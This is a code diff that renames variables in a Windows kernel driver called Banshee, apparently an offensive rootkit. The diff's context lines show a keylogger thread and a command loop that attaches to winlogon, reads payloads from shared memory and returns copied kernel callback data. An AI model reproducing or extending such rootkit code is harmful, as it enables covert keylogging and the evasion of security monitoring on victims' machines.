@@ -29,8 +29,8 @@ BeUnload()
 {
     LOG_MSG("Unload Called \r\n");
 
-    BeGlobals::Shutdown = true;
-    BeGlobals::LogKeys = false;
+    BeGlobals::bShutdown = true;
+    BeGlobals::bLogKeys = false;
 
     KeWaitForSingleObject(&BeGlobals::hKeyLoggerTerminationEvent, Executive, KernelMode, FALSE, NULL);
     KeWaitForSingleObject(&BeGlobals::hMainLoopTerminationEvent, Executive, KernelMode, FALSE, NULL);
@@ -114,17 +114,15 @@ BeUnload()
 
 /*
  * @brief Main loop function that waits for commands and executes corresponding actions.
- *
- * @param[in] StartContext Unused parameter.
  */
 VOID
-BeMainLoop(PVOID StartContext)
+BeMainLoop(PVOID startContext)
 {
-    UNREFERENCED_PARAMETER(StartContext);
+    UNREFERENCED_PARAMETER(startContext);
 
-    KAPC_STATE Apc;
+    KAPC_STATE apc;
 
-    while (!BeGlobals::Shutdown)
+    while (!BeGlobals::bShutdown)
     {
         LOG_MSG("Waiting for commandEvent...\n");
         NTSTATUS status = BeWaitForEvent(BeGlobals::commandEvent);
@@ -139,10 +137,10 @@ BeMainLoop(PVOID StartContext)
         //
         // Read command payload
         //
-        KeStackAttachProcess(BeGlobals::winLogonProc, &Apc);
+        KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
         BANSHEE_PAYLOAD payload = *(BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory;
         LOG_MSG("Read: %d\n", payload.cmdType);
-        KeUnstackDetachProcess(&Apc);
+        KeUnstackDetachProcess(&apc);
         
         //
         // Execute command
@@ -169,7 +167,7 @@ BeMainLoop(PVOID StartContext)
                 //
                 // Write answer: copy over callbacks
                 //
-                KeStackAttachProcess(BeGlobals::winLogonProc, &Apc);
+                KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
                 for (auto i = 0U; i < cbData.size(); ++i)
                 {
                     memcpy((PVOID)&(*((BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory)).callbackData[i], (PVOID)&cbData[i], sizeof(CALLBACK_DATA));
@@ -179,7 +177,7 @@ BeMainLoop(PVOID StartContext)
                 // Write amount of callbacks to ulValue
                 //
                 (*((BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory)).ulValue = (ULONG)cbData.size();
-                KeUnstackDetachProcess(&Apc);
+                KeUnstackDetachProcess(&apc);
             }
 
             bansheeStatus = STATUS_SUCCESS;
@@ -205,9 +203,9 @@ BeMainLoop(PVOID StartContext)
         //
         // Write answer
         //
-        KeStackAttachProcess(BeGlobals::winLogonProc, &Apc);
+        KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
         (*((BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory)).status = bansheeStatus;
-        KeUnstackDetachProcess(&Apc);
+        KeUnstackDetachProcess(&apc);
 
         //
         // Set answer event
@@ -264,7 +262,7 @@ BansheeEntry(
     NtStatus = PsCreateSystemThread(&hMainLoop, THREAD_ALL_ACCESS, NULL, NULL, NULL, BeMainLoop, NULL);
     if (NtStatus != 0)
     {
-        BeGlobals::LogKeys = false;
+        BeGlobals::bLogKeys = false;
         ZwClose(hKeyloggerThread);
         return NtStatus;
     }
